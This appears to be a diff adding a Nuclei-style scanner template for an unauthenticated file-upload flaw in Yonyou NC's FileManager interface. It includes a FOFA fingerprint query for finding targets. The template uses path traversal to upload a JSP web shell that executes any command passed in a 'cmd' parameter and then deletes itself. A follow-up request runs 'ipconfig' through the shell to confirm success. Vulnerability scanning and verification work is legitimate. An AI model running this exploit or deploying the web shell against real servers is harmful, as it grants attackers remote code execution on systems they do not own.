@@ -1,0 +1,45 @@
+id: yongyouNC-FileManager-File-upload
+
+info:
+  name: 用友 NC FileManager 文件上传
+  author: unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="1085941792"
+    用友 NC nc.uap.lfw.file.FileManager 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+  
+http:
+  - raw:
+      - |
+        POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+        --d0b7a0d40eed0e32904c8017b09eb305
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: text/plain
+        
+        <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --d0b7a0d40eed0e32904c8017b09eb305--
+
+      
+      - |
+        GET /{{username}}.jsp?cmd=ipconfig HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Windows IP'
+      - type: status
+        status: 
+          - 200
